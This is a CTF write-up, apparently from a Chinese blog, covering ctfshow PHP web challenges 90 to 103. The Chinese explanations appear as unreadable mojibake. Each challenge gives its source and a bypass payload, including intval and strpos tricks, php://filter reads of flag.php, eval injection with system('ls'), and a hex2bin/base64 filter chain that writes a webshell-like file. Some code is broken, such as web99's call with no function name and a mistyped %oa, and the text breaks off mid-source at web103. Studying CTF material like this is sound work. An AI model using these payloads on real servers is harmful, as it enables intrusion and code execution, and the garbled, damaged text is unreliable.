0ã€‚\n4.å½“ç¬¬äºŒä¸ªå‚æ•°$baseè¢«æŒ‡å®šæ—¶ï¼Œintval()å¯ä»¥å°†å­—ç¬¦ä¸²æŒ‰ç…§æŒ‡å®šçš„è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶æ•´æ•°ã€‚\næ³¨æ„äº‹é¡¹\n1.å¯¹äºæµ®ç‚¹æ•°ï¼Œintval()ä¼šç›´æ¥æˆªæ–­å°æ•°éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿›è¡Œå››èˆäº”å…¥ã€‚\n2.å½“å¤„ç†è¶…å‡ºæ•´æ•°èŒƒå›´çš„å€¼æ—¶ï¼ˆåœ¨ PHP ä¸­ï¼Œæ ¹æ®å¹³å°å’Œé…ç½®ä¸åŒï¼Œæ•´æ•°èŒƒå›´æœ‰æ‰€ä¸åŒï¼‰ï¼Œå¯èƒ½ä¼šå‡ºç°æ„å¤–çš„ç»“æœã€‚ä¾‹å¦‚ï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸Šï¼Œintç±»å‹çš„æœ€å¤§å€¼æ˜¯2147483647ï¼Œå¦‚æœintval()å¤„ç†çš„å€¼è¶…è¿‡è¿™ä¸ªèŒƒå›´ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–è€…ä¸æ­£ç¡®çš„è½¬æ¢ã€‚\nè¿™é“é¢˜ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡\npayload:\n?num[]=1 web90 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:06:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17if(isset($_GET[\u0026#39;num\u0026#39;])){ 18 $num = $_GET[\u0026#39;num\u0026#39;]; 19 if($num===\u0026#34;4476\u0026#34;){ 20 die(\u0026#34;no no no!\u0026#34;); 21 } 22 if(intval($num,0)===4476){ 23 echo $flag; 24 }else{ 25 echo intval($num,0); 26 } 27} è®¾ç½®$base = 0èƒ½æä¾›ä¸€ç§æ ¹æ®å­—ç¬¦ä¸²å†…å®¹è‡ªåŠ¨åˆ¤æ–­è¿›åˆ¶æ¥è¿›è¡Œè½¬æ¢çš„çµæ´»æ–¹å¼ã€‚\nè¿™é“é¢˜å¯ä»¥åˆ©ç”¨intvalçš„ç‰¹æ€§å’Œphpå¼ºæ¯”è¾ƒçš„ç‰¹æ€§\nå½“å˜é‡æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œintval()ä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€‚å®ƒä¼šä»å­—ç¬¦ä¸²çš„å¼€å¤´æå–æ•°å­—éƒ¨åˆ†ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚\nweb91 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:16:09 9# @link: https://ctfer.com 10 11*/ 12 13show_source(__FILE__); 14include(\u0026#39;flag.php\u0026#39;); 15$a=$_GET[\u0026#39;cmd\u0026#39;]; 16if(preg_match(\u0026#39;/^php$/im\u0026#39;, $a)){ 17 if(preg_match(\u0026#39;/^php$/i\u0026#39;, $a)){ 18 echo \u0026#39;hacker\u0026#39;; 19 } 20 else{ 21 echo $flag; 22 } 23} 24else{ 25 echo \u0026#39;nonononono\u0026#39;; 26} è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç†è§£å’Œç»•è¿‡\nè¿™ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼éƒ½æ˜¯ç”¨æ¥åŒ¹é…å­—ç¬¦ä¸²phpçš„\n/^php$/im çš„å«ä¹‰ ^ï¼šè¡¨ç¤ºå­—ç¬¦ä¸²çš„å¼€å§‹ã€‚ phpï¼šè¡¨ç¤ºåŒ¹é…å­—ç¬¦ phpã€‚ $ï¼šè¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸã€‚ iï¼šè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚ mï¼šè¡¨ç¤ºå¤šè¡Œæ¨¡å¼ï¼ˆmulti-lineï¼‰ã€‚ è¦å¾—åˆ°flagï¼Œæˆ‘ä»¬éœ€è¦è®©ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¸ºtrueï¼Œç¬¬äºŒä¸ªåˆ¤æ–­ä¸ºfalse\nè€Œç¬¬äºŒä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸æ­£åˆ™è¡¨è¾¾å¼ä¸€çš„åŒºåˆ«åœ¨äºä»–æ²¡æœ‰è¿›è¡Œå¤šè¡ŒåŒ¹é…\né‚£æˆ‘ä»¬åªéœ€è¦é€šè¿‡æ¢è¡Œç¬¦å°±å¯ä»¥å®ç°ç»•è¿‡\npayload:\ncmd=%oaphp web92 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:29:30 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(intval($num,0)==4476){ 21 echo $flag; 22 }else{ 23 echo intval($num,0); 24 } 25} è¿™é¢˜ä¸90é¢˜çš„åŒºåˆ«å°±åœ¨äºè¿™é‡Œè¿›è¡Œçš„æ˜¯å¼±ç±»å‹çš„æ¯”è¾ƒ\nåœ¨å¼±ç±»å‹çš„æ¯”è¾ƒé‡Œé¢æˆ‘ä»¬ä¸èƒ½é€šè¿‡å¢åŠ å­—æ¯çš„æ–¹å¼ç»•è¿‡ï¼Œå¦‚ä¸‹\n\u0026#34;123aa\u0026#34; == 123\r\u0026#34;123aa\u0026#34; === 123aa æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¶å®ƒæ–¹æ³•æ¥ç»•è¿‡\nå¦‚é€šè¿‡intvalå‡½æ•°çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥è½¬æ¢æˆå…¶ä»–è¿›åˆ¶çš„4476æ¥è¿›è¡Œç»•è¿‡ï¼ˆå‰é¢è¯´è¿‡å½“base=0æ—¶ä¼šè‡ªåŠ¨è¿›è¡Œè¿›åˆ¶çš„è½¬æ¢ï¼‰ã€‚\npayloadï¼š\nHEX: 0x117c //åè¿›åˆ¶å‰é¢è¡¥0x\rOCT: 010574 //å…«è¿›åˆ¶å‰é¢è¡¥0 æˆ–è€…\nå®˜æ–¹é¢˜è§£\nintval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å–,ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123\nweb93 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:32:58 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num,0)==4476){ 24 echo $flag; 25 }else{ 26 echo intval($num,0); 27 } 28} preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num) ç›¸æ¯”ä¸Šä¸€é¢˜è¿™é¢˜å¢åŠ äº†ä¸€ä¸ªå­—æ¯çš„åŒ¹é…ï¼Œè®©æˆ‘ä»¬ä¸èƒ½ç”¨ä¸Šä¸€é¢˜eç»•è¿‡çš„æ–¹æ³•å’Œåå…­è¿›åˆ¶ç»•è¿‡çš„æ–¹æ³•\nä½†æ˜¯å…«è¿›åˆ¶ç»•è¿‡ä¾æ—§æ˜¯å¯è¡Œçš„ï¼Œå› ä¸ºä»–ä¸åŒ…å«å­—æ¯\npayload:\nnum=010574 web94 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:46:19 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num===\u0026#34;4476\u0026#34;){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} !strpos($num, \u0026#34;0\u0026#34;) è¿™é¢˜å¢åŠ äº†ä¸€ä¸ªæ¡ä»¶ï¼ŒåŒæ—¶åˆ¤æ–­ä¹Ÿå˜æˆäº†å¼ºåˆ¤å®šï¼Œè¿™é‡Œçš„strpos()å‡½æ•°ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚\nä¹Ÿå°±æ˜¯è¿™é‡Œæˆ‘ä»¬éœ€è¦è®©é¦–ä½ä¸ç­‰äº0æ‰èƒ½ä½¿è¿™ä¸ªåˆ¤æ–­ä¸ºfalse\nstropså‡½æ•°ç»•è¿‡ï¼š å¯¹äºstrpos()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¢è¡Œè¿›è¡Œç»•è¿‡ï¼ˆ%0aï¼‰ payload:?num=%0a010574 ä¹Ÿå¯ä»¥å°æ•°ç‚¹ç»•è¿‡ payloadï¼š?num=4476.0 å› ä¸ºintval()å‡½æ•°åªè¯»å–æ•´æ•°éƒ¨åˆ† è¿˜å¯ä»¥å…«è¿›åˆ¶ç»•è¿‡(%20æ˜¯ç©ºæ ¼çš„urlç¼–ç å½¢å¼) payloadï¼š?num=%20010574 ?num= 010574 // å‰é¢åŠ ä¸ªç©ºæ ¼ ?num=+010574 ?num=+4476.0\næˆ‘ä»¬é€‰ç”¨å…¶ä¸­ä¸€ä¸ªç»•è¿‡æ–¹æ³•å³å¯\nå¦‚ç©ºæ ¼ç»•è¿‡\n?num=%20010574 è¿™é¢˜å› ä¸ºç”¨çš„æ˜¯å¼ºåˆ¤å®šä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹æ³•\n?num=4476.0 è¿™ç§æ–¹æ³•å°±æ˜¯ä½¿å…¶å˜ä¸ºæµ®ç‚¹å‹ä»è€Œä½¿å¼ºåˆ¤å®šä¸ºfalseï¼Œç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤å®š\nweb95 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:53:59 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!!!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«å°±æ˜¯æ”¹ä¸ºäº†å¼±åˆ¤å®š\næ‰€ä»¥ä¸Šä¸€é¢˜çš„æ–¹æ³•äºŒå°±ç”¨ä¸äº†äº†ï¼Œæˆ‘ä»¬ç”¨æ–¹æ³•ä¸€å³å¯\npayload:\n?num=%20010574 web96 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:21:24 9# @link: https://ctfer.com 10 11*/ 12 13 14highlight_file(__FILE__); 15 16if(isset($_GET[\u0026#39;u\u0026#39;])){ 17 if($_GET[\u0026#39;u\u0026#39;]==\u0026#39;flag.php\u0026#39;){ 18 die(\u0026#34;no no no\u0026#34;); 19 }else{ 20 highlight_file($_GET[\u0026#39;u\u0026#39;]); 21 } 22 23 24} æˆ‘ä»¬çŸ¥é“./æŒ‡çš„çš„æ˜¯å½“å‰ç›®å½•ï¼Œæ‰€ä»¥ç›´æ¥ç”¨./ç»•è¿‡å³å¯ï¼Œä¸å½±å“æ–‡ä»¶è¯»å–\npayload:\n?u=./flag.php or\nu=/var/www/html/flag.php\r?u=php://filter/read=convert.base64-encode/resource=flag.php web97 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:36:32 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if (isset($_POST[\u0026#39;a\u0026#39;]) and isset($_POST[\u0026#39;b\u0026#39;])) { 16if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) 17if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) 18echo $flag; 19else 20print \u0026#39;Wrong.\u0026#39;; 21} 22?\u0026gt; è¿™æ˜¯ä¸€é“md5å¼ºæ¯”è¾ƒçš„é¢˜ç›®ï¼Œç»•è¿‡å§¿åŠ¿æŒºå¤š\næˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„æ•°ç»„ç»•è¿‡\na[]=1\u0026amp;b[]=2 è™½ç„¶ä¼šæŠ¥é”™ä½†æ˜¯èƒ½æ‹¿åˆ°flag\nweb98 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 21:39:27 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14$_GET?$_GET=\u0026amp;$_POST:\u0026#39;flag\u0026#39;; 15$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_COOKIE:\u0026#39;flag\u0026#39;; 16$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_SERVER:\u0026#39;flag\u0026#39;; 17highlight_file($_GET[\u0026#39;HTTP_FLAG\u0026#39;]==\u0026#39;flag\u0026#39;?$flag:__FILE__); 18 19?\u0026gt; CTFSHOW webå…¥é—¨åˆ·é¢˜ web98-112_ctfshow web98-CSDNåšå®¢\nè¿™é“é¢˜ç”¨åˆ°äº†ä¸‰å…ƒè¿ç®—ç¬¦\né¦–å…ˆåˆ¤æ–­æ˜¯å¦GETä¼ å…¥äº†æ•°æ®ï¼Œå¦‚æœä¼ å…¥äº†åˆ™å°†POSTçš„åœ°å€èµ‹å€¼ç»™äº†GET\nå…¶å®å°±æ˜¯ç”¨POSTæ›¿æ¢GET\nå¦‚æœGETå­˜åœ¨flagå­—æ®µçš„å€¼åˆ™ä¼šç»§ç»­æ›¿æ¢ï¼Œæœ€åæ›¿æ¢æˆSERVER\nè¿™é‡Œæˆ‘ä»¬åªè¦GETéšä¾¿ä¼ å…¥ä¸€ä¸ªæ•°æ®è®©postæ›¿æ¢get\nç„¶åpostä¼ å…¥ HTTP_FLAG=flag\nè¿™æ ·æœ€åhighlight_fileå°±èƒ½å»æ˜¾ç¤º$flag\nè¿™é“é¢˜ä¸€å¼€å§‹æ²¡çœ‹æ‡‚ä»£ç ï¼Œçœ‹äº†ä¸Šé¢å¤§ä½¬çš„è§£é‡Šæ„Ÿè§‰å…¶å®ä¹Ÿä¸éš¾\nweb99 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 22:36:12 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14$allow = array(); 15for ($i=36; $i \u0026lt; 0x36d; $i++) { 16 array_push($allow, rand(1,$i)); 17} 18if(isset($_GET[\u0026#39;n\u0026#39;]) \u0026amp;\u0026amp; in_array($_GET[\u0026#39;n\u0026#39;], $allow)){ 19 ($_GET[\u0026#39;n\u0026#39;], $_POST[\u0026#39;content\u0026#39;]); 20} 21 22?\u0026gt; è¿™é“é¢˜é¦–å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åé€šè¿‡å¾ªç¯å†™å…¥æ•°å­—ï¼ˆèŒƒå›´0~0x36dï¼‰\næ¥ç€å¯¹ä¼ å…¥çš„nè¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­å…¶æ˜¯å¦åœ¨æ•°ç»„ä¸­ï¼Œè‹¥å­˜åœ¨åˆ™ä»¥nä¸ºåå­—åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥contentçš„å†…å®¹\næˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ï¼š\nåœ¨å¼±ç±»å‹ä¸­å½“phpå­—ç¬¦ä¸²å’Œintæ¯”è¾ƒæ—¶,å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆintï¼Œæ‰€ä»¥ å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚é¢˜ç›®ä¸­çš„in_arrayæ²¡æœ‰è®¾ç½®type,æˆ‘ä»¬å¯ä»¥è¾“å…¥å­—ç¬¦ä¸²5.php(æ­¤å¤„æ•°å­—éšæ„ï¼Œåªè¦åœ¨rand(1,0x36d)ä¹‹é—´å³å¯),è½¬æ¢ä¹‹åä¹Ÿå°±æ˜¯5,æ˜æ˜¾æ˜¯åœ¨é¢˜ç›®ä¸­ç”Ÿæˆçš„æ•°ç»„ä¸­çš„\næ‰€ä»¥æˆ‘ä»¬é€šè¿‡ä¼ å…¥contentå†™é©¬åï¼Œé€šè¿‡èšå‰‘è¿æ¥æˆ–è€…ç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯å¾—åˆ°flag\nweb100 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-21 22:10:28 9\\# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ 23 if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30 31 32?\u0026gt; è¿™é¢˜å…¶å®å°±æ˜¯ä¸€é“ç®€å•çš„æ‹¼æ¥é¢˜\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); è¿™é‡Œçœ‹èµ·æ¥åƒæ˜¯è¦æ±‚v1ï¼Œv2ï¼Œv3éƒ½ä¸ºæ•°å­—ï¼Œå®é™…ä¸Šåªéœ€v1ä¸ºæ•°å­—åˆ™ä¼šå°†v1èµ‹ç»™v0ï¼Œè€Œä¸ä¼šå†æ‰§è¡Œåé¢çš„è¯­å¥\næ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåªéœ€è¦ä½¿v1ä¸ºæ•°å­—å³å¯\npayload:\n?v1=21\u0026amp;v2=var_dump($ctfshow)/*\u0026amp;v3=*/; æˆ–è€…ç”¨å‘½ä»¤\n1?v1=1\u0026amp;v2=system(\u0026#39;ls\u0026#39;)/*\u0026amp;v3=*/; å°†0x2dæ›´æ¢æˆ-å¾—åˆ°flag\nweb101 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-22 00:26:48 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|[0-9]/\u0026#34;, $v2)){ 23 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|[0-9]/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30?\u0026gt; é¢˜ç›®æè¿°:ä¿®è¡¥100é¢˜éé¢„æœŸ,æ›¿æ¢0x2d\nä¿®è¡¥äº†ä¸Šä¸€é¢˜é€šè¿‡ç›´æ¥å‘½ä»¤æ‰§è¡Œæˆ–è€…var_dumpæ‰“å°ç±»çš„æ–¹æ³•\næˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨åå°„ç±»çš„æ–¹æ³•ï¼Œåˆ©ç”¨é¢˜ç›®ç»™å‡ºçš„('ctfshow')æ¥æ‹¼æ¥æ‰“å°ç±»\npayload:\n?v1=1\u0026amp;v2=echo new Reflectionclass\u0026amp;v3=; è¿™é“é¢˜çš„flagå°‘äº†ä¸€ä½ï¼Œåœ¨å¾—åˆ°çš„flagåœ¨æ›¿æ¢æ‰0x2dåï¼Œå†è¿›è¡Œçˆ†ç ´å³å¯å¾—åˆ°flag\npayload:\n1a = \u0026#34;fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42\u0026#34; 2b = a.replace(\u0026#34;0x2d\u0026#34;,\u0026#34;-\u0026#34;) 3hex = [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;4\u0026#34;,\u0026#34;5\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;,\u0026#34;d\u0026#34;,\u0026#34;e\u0026#34;] 4for i in hex: 5 print(\u0026#34;ctfshow{\u0026#34;+b+i+\u0026#34;}\u0026#34;) web102 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 20:59:43 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 file_put_contents($v3,$str); 23} 24else{ 25 die(\u0026#39;hacker\u0026#39;); 26} 27 28 29?\u0026gt; åˆ†æä¸€ä¸‹è¿™æ®µä»£ç \né¦–å…ˆè¿™æ®µä»£ç ä¼šæ¥æ”¶ä¸‰ä¸ªå‚æ•°v1,v2,v3\næ ¹æ®phpçš„ç‰¹æ€§ï¼Œå½“$v2ä¸ºæ•°å­—æ—¶$v4å°±ä¼šè¢«èµ‹å€¼ä¸º1ï¼Œè€Œä¸$v3çš„å€¼æ— å…³\næ‰€ä»¥æƒ³è¦è¿›å…¥åˆ¤æ–­ï¼Œæˆ‘ä»¬é¦–å…ˆè¦ä½¿v2ä¸ºæ•°å­—\næ¥ç€ä¼šé€šè¿‡substrå¯¹v2å‰ä¸¤æ®µè¿›è¡Œæˆªæ–­å¹¶èµ‹å€¼ç»™s\nä¸‹ä¸€æ­¥å°±ä¼šå°†v1å’Œséƒ½ä¼ å…¥call_user_funcå‡½æ•°\ncall_user_funcå‡½æ•°æœ‰ä»€ä¹ˆç”¨å‘¢?\ncall_user_func æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯è°ƒç”¨å›è°ƒå‡½æ•°ã€‚\nfunction greet($name) {\rreturn \u0026#34;Hello, $name!\u0026#34;;\r}\r$message = call_user_func(\u0026#39;greet\u0026#39;, \u0026#39;John\u0026#39;);\recho $message; æˆ‘ä»¬å…ˆä¸ç®¡ä»–æ€ä¹ˆåˆ©ç”¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹\næœ€åä¼šè°ƒç”¨file_put_contentså‡½æ•°ï¼Œé‚£æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬é€šè¿‡å†™æ–‡ä»¶æ¥æ‹¿åˆ°flag\nä½†æ˜¯æˆ‘ä»¬è¦å°†v2è¿™ä¸€ä¸²æ•°å­—ç»è¿‡ä¸€ç³»åˆ—è½¬æ¢åå†™å…¥æ–‡ä»¶å¹¶æ‰§è¡Œè¦æ€ä¹ˆåšå‘¢ï¼Ÿ\nå‡å¦‚è¯´æˆ‘ä»¬å¯ä»¥å°†phpä»£ç è½¬æ¢æˆbase64åå†è½¬æ¢æˆhexï¼Œè€Œå¾—åˆ°çš„hexåˆåˆšå¥½ä¸ºæ•°å­—ï¼Œé‚£æˆ‘ä»¬å°±èƒ½å®ç°æˆ‘ä»¬çš„ç›®æ ‡ã€‚\né‚£æ€ä¹ˆè¿›è¡Œæ ¼å¼è½¬æ¢å‘¢?\næˆ‘ä»¬å¯ä»¥é€šè¿‡call_user_funcå‡½æ•°è°ƒç”¨phpçš„å†…ç½®ç±»hex2binï¼Œå°†æˆ‘ä»¬ä¼ å…¥çš„v2è½¬æ¢å›base64ç¼–ç ï¼Œæ¥ç€åœ¨å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œå†é€šè¿‡phpä¼ªåè®®çš„æ–¹å¼å°†base64å…ˆè½¬æ¢ä¸ºæˆ‘ä»¬çš„ä»£ç å†å†™å…¥æ–‡ä»¶ã€‚\nç»è¿‡å°è¯•æˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¬¦åˆæ¡ä»¶çš„ä»£ç \n\u0026lt;?=`cat *`;\rbase64:PD89YGNhdCAqYDs= (è½¬hexå»æ‰=)\rhex:5044383959474E6864434171594473 æˆ‘ä»¬éœ€è¦åœ¨hexå‰é¢éšä¾¿åŠ ä¸¤ä½æ•°å­—æ¥ç»•è¿‡æˆªæ–­\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web103 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 21:03:24 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 